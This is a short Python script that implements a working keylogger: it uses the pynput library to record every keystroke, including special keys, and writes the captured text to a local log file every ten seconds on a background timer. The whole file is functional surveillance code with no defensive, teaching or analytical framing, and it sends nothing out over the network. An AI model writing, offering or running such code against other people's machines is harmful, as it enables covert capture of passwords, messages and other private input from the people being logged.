import pynput.keyboard
import threading

class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log = ""
        self.log_file = log_file

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            self.append_to_log(str(key.char))
        except AttributeError:
            # Handle special keys
            if key == key.space:
                self.append_to_log(" ")
            elif key == key.enter:
                self.append_to_log("[ENTER]\n")
            else:
                self.append_to_log(f"[{key.name}]")

    def report(self):
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""
        # Report every 10 seconds
        timer = threading.Timer(10, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        print("Keylogger started.")
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
